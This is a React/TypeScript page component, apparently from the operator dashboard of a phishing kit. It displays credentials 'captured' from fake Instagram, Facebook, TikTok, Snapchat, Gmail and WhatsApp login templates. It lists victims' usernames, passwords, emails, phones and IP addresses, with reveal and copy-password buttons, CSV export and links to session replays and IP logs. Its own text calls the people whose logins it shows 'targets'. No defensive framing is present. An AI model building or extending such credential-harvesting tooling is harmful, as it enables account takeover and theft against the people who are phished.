import { useEffect, useState, useCallback, useRef } from 'react'
import { api, Session, Credential } from '../api/client'
import { exportCSV } from '../utils/export'
import { relativeTime } from '../utils/time'
import ErrorBanner from '../components/ErrorBanner'
import LoadMoreButton from '../components/LoadMoreButton'
import SessionFilter from '../components/SessionFilter'

function passwordStrength(pw: string | null): { label: string; color: string; score: number } | null {
  if (!pw || pw.length < 2) return null
  let score = 0
  if (pw.length >= 8) score++
  if (pw.length >= 12) score++
  if (/[A-Z]/.test(pw)) score++
  if (/[a-z]/.test(pw)) score++
  if (/[0-9]/.test(pw)) score++
  if (/[^A-Za-z0-9]/.test(pw)) score++
  if (score <= 1) return { label: 'Weak', color: '#ff453a', score }
  if (score <= 3) return { label: 'Fair', color: '#ff9f0a', score }
  if (score <= 5) return { label: 'Good', color: '#30d158', score }
  return { label: 'Strong', color: '#30d158', score }
}

const TEMPLATE_ICONS: Record<string, string> = {
  instagram: '📷', facebook: '📘', tiktok: '🎵', snapchat: '👻',
  gmail: '✉', whatsapp: '💬'
}

function getCodeParam(): string {
  return new URLSearchParams(window.location.search).get('code') || ''
}

export default function Credentials() {
  const [creds, setCreds] = useState<Credential[]>([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [revealed, setRevealed] = useState<Set<string>>(new Set())
  const [search, setSearch] = useState('')
  const [sessions, setSessions] = useState<Session[]>([])
  const [sessionFilter, setSessionFilter] = useState('')
  const offsetRef = useRef(0)
  const [hasMore, setHasMore] = useState(true)
  const [loadingMore, setLoadingMore] = useState(false)
  const [paused, setPaused] = useState(false)
  const LIMIT = 50

  const fetchData = useCallback(async (append = false, useOffset?: number) => {
    const off = useOffset ?? (append ? offsetRef.current : 0)
    try {
      setError(null)
      const result = await api.credentials(off, LIMIT, sessionFilter)
      if (append) {
        setCreds(prev => [...prev, ...result.entries])
      } else {
        setCreds(result.entries)
      }
      offsetRef.current = off + (append ? 0 : 0)
      setHasMore(result.has_more)
    } catch (e) {
      setError(e instanceof Error ? e.message : 'Failed to load')
    } finally {
      setLoading(false)
      setLoadingMore(false)
    }
  }, [sessionFilter])

  useEffect(() => {
    api.sessions().then(setSessions).catch(() => {})
  }, [])

  useEffect(() => {
    offsetRef.current = 0
    setCreds([])
    setLoading(true)
    fetchData(false, 0)
  }, [sessionFilter, fetchData])

  useEffect(() => {
    if (paused) return
    const t = setInterval(() => fetchData(false, 0), 15000)
    return () => clearInterval(t)
  }, [paused, sessionFilter, fetchData])

  const loadMore = () => {
    setLoadingMore(true)
    const nextOffset = offsetRef.current + LIMIT
    offsetRef.current = nextOffset
    fetchData(true, nextOffset)
  }

  const toggleReveal = (id: string) => {
    setRevealed(prev => {
      const next = new Set(prev)
      if (next.has(id)) next.delete(id); else next.add(id)
      return next
    })
  }

  const copy = (text: string) => navigator.clipboard.writeText(text)

  const handleDelete = async (id: string) => {
    try {
      setError(null)
      await api.deleteCredential(id)
      setCreds(prev => prev.filter(c => c.id !== id))
    } catch (e) {
      setError('Failed to delete')
    }
  }

  const handleDeleteAll = async () => {
    if (!confirm('Delete ALL captured credentials?')) return
    if (!confirm('Are you absolutely sure? This cannot be undone.')) return
    try {
      setError(null)
      await api.deleteAllCredentials()
      setCreds([])
      setHasMore(false)
    } catch (e) {
      setError('Failed to delete all')
    }
  }

  const filtered = creds.filter(c => {
    if (!search) return true
    const q = search.toLowerCase()
    return [c.username, c.email, c.phone, c.ip_address, c.template_id, c.session_id, c.password]
      .some(f => f?.toLowerCase().includes(q))
  })

  if (loading) return <div className="flex justify-center py-20"><div className="spinner"></div></div>

  return (
    <div className="space-y-4 stagger">
      <ErrorBanner error={error} onDismiss={() => setError(null)} />

      <div className="flex items-center justify-between flex-wrap gap-3 animate-fade-in">
        <div>
          <h1 className="text-xl font-bold text-primary">Credentials</h1>
          <p className="text-sm text-tertiary mt-0.5">{filtered.length} of {creds.length} login credentials captured</p>
        </div>
        <div className="flex items-center gap-2">
          <button onClick={() => setPaused(p => !p)} className="select-apple cursor-pointer text-sm">
            {paused ? '▶ Resume' : '⏸ Pause'}
          </button>
          {creds.length > 0 && (
            <>
              <button onClick={() => exportCSV(filtered.map(c => ({
                username: c.username, password: c.password, email: c.email, phone: c.phone,
                template: c.template_id, ip: c.ip_address, session: c.session_id,
                date: new Date(c.created_at * 1000).toISOString()
              })), 'credentials.csv')} className="select-apple cursor-pointer">📥 CSV</button>
              <button onClick={handleDeleteAll} className="select-apple cursor-pointer"
                style={{ color: 'var(--accent)' }}>🗑 Delete All</button>
            </>
          )}
          <button onClick={() => { setCreds([]); setLoading(true); fetchData(false) }} className="select-apple cursor-pointer">⟳</button>
        </div>
      </div>

      <div className="flex gap-2">
        <input type="text" placeholder="Search username, email, phone, IP, password, session..."
          value={search} onChange={e => setSearch(e.target.value)} className="input-apple" />
        <SessionFilter sessions={sessions} value={sessionFilter} onChange={setSessionFilter} />
      </div>

      {filtered.length === 0 ? (
        <div className="empty-state animate-fade-in">
          <div className="icon">🔑</div>
          <h3>{search ? 'No matches' : 'No credentials captured yet'}</h3>
          <p>{search ? 'Try a different search' : 'Credentials appear when targets enter login info on social media templates'}</p>
        </div>
      ) : (
        <div className="space-y-3">
          {filtered.map((c, i) => {
            const strength = passwordStrength(c.password)
            return (
              <div key={c.id} className="content-card stagger animate-fade-in"
                style={{ animationDelay: `${Math.min(i * 0.02, 0.5)}s` }}>
                <div className="flex items-start justify-between">
                  <div className="flex items-center gap-3 min-w-0">
                    <span className="text-2xl select-none shrink-0">{TEMPLATE_ICONS[c.template_id ?? ''] || '🔒'}</span>
                    <div className="min-w-0">
                      <div className="text-sm font-semibold text-primary truncate">{c.username || 'unknown'}</div>
                      <div className="text-xs text-tertiary flex items-center gap-2 flex-wrap">
                        <span className="mono">{c.template_id}</span>
                        <span>·</span>
                        <a href={`/?code=${getCodeParam()}#/replay`} className="mono accent hover:underline"
                          title={c.session_id}>{c.session_id.substring(0, 16)}</a>
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center gap-2 shrink-0">
                    {strength && (
                      <span className="text-[10px] px-1.5 py-0.5 rounded font-medium"
                        style={{ backgroundColor: strength.color + '20', color: strength.color }}>
                        {strength.label}
                      </span>
                    )}
                    <button onClick={() => handleDelete(c.id)} className="text-xs text-tertiary hover:text-red-400">🗑</button>
                    <span className="text-xs text-tertiary whitespace-nowrap" title={new Date(c.created_at * 1000).toLocaleString()}>
                      {relativeTime(c.created_at)}
                    </span>
                  </div>
                </div>
                <div className="mt-3 grid grid-cols-2 gap-3">
                  <div className="bg-primary radius-card p-2.5">
                    <div className="text-[10px] text-tertiary uppercase tracking-wider">Password</div>
                    <div className="flex items-center gap-2 mt-1">
                      <code className="text-xs text-secondary flex-1 truncate">
                        {revealed.has(c.id) ? c.password : '••••••••••••'}
                      </code>
                      <button onClick={() => toggleReveal(c.id)}
                        className="text-xs text-tertiary hover:text-secondary">
                        {revealed.has(c.id) ? '🙈' : '👁'}
                      </button>
                      <button onClick={() => copy(c.password ?? '')}
                        className="text-xs text-tertiary hover:text-secondary">📋</button>
                    </div>
                  </div>
                  <div className="bg-primary radius-card p-2.5">
                    <div className="text-[10px] text-tertiary uppercase tracking-wider">IP Address</div>
                    <a href={`/?code=${getCodeParam()}#/ips`}
                      className="text-xs accent mono mt-1 block break-all hover:underline"
                      title="View IP logs">{c.ip_address || 'unknown'}</a>
                  </div>
                  <div className="bg-primary radius-card p-2.5">
                    <div className="text-[10px] text-tertiary uppercase tracking-wider">Email</div>
                    <code className="text-xs mono mt-1 block break-all" style={{ color: '#34c759' }}>{c.email || '—'}</code>
                    {c.email && (
                      <button onClick={() => copy(c.email!)}
                        className="text-[10px] text-tertiary hover:text-secondary mt-1">📋 Copy</button>
                    )}
                  </div>
                  <div className="bg-primary radius-card p-2.5">
                    <div className="text-[10px] text-tertiary uppercase tracking-wider">Phone</div>
                    <code className="text-xs mono mt-1 block break-all" style={{ color: '#ff9f0a' }}>{c.phone || '—'}</code>
                    {c.phone && (
                      <button onClick={() => copy(c.phone!)}
                        className="text-[10px] text-tertiary hover:text-secondary mt-1">📋 Copy</button>
                    )}
                  </div>
                </div>
                <div className="mt-3 flex gap-2">
                  <button onClick={() => copy(c.username ?? '')}
                    className="text-xs px-3 py-1.5 bg-tertiary text-secondary rounded-lg hover:text-primary transition-colors">📋 Copy Username</button>
                  <button onClick={() => copy(c.password ?? '')}
                    className="text-xs px-3 py-1.5 bg-tertiary text-secondary rounded-lg hover:text-primary transition-colors">📋 Copy Password</button>
                </div>
              </div>
            )
          })}
          <LoadMoreButton hasMore={hasMore} loading={loadingMore} onLoad={loadMore} />
        </div>
      )}
    </div>
  )
}
